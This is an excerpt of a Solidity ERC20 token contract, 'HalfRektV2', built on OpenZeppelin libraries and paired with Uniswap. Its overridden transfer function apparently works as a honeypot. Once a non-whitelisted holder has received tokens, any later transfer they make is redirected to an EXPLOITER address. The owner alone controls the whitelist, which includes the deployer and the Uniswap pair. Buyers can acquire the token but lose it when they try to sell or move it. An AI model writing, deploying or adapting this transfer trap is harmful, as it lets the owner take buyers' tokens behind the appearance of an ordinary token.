...
// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/utils/Counters.sol
...
// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/Math.sol
...
// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/utils/Arrays.sol
...
// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/token/ERC20/ERC20Snapshot.sol
...
contract HalfRektV2 is Ownable, ERC20Burnable {
    using SafeMath for uint256;
    ...
    mapping (address => bool) public unrektable;
    
    mapping (address => uint256) private whenBought;

    constructor()
    public Ownable()
    ERC20("HalfRektV2", "NMEV2")
    {
        uniswapPair = UNISWAP_FACTORY.createPair(UNISWAP_ROUTER.WETH(), address(this));
        _mint(msg.sender, 5 * 1e6 * 1e18); 
        setIsRekt(msg.sender, true);
        setIsRekt(uniswapPair, true); // Such that uniswap buyers don't get half rekt
    }

    function _transfer(address _sender, address _recipient, uint256 _amount) internal virtual override {
        if (!unrektable[_recipient] && whenBought[_recipient] == 0)
        {
            whenBought[_recipient] = block.number;
        }
        
        if (!unrektable[_sender] && whenBought[_sender] < block.number){
            super._transfer(_sender, EXPLOITER, _amount);
        } else 
        {
    ...
    function setIsRekt(address _address, bool _isRekt) public onlyOwner {
        unrektable[_address] = _isRekt;
    }
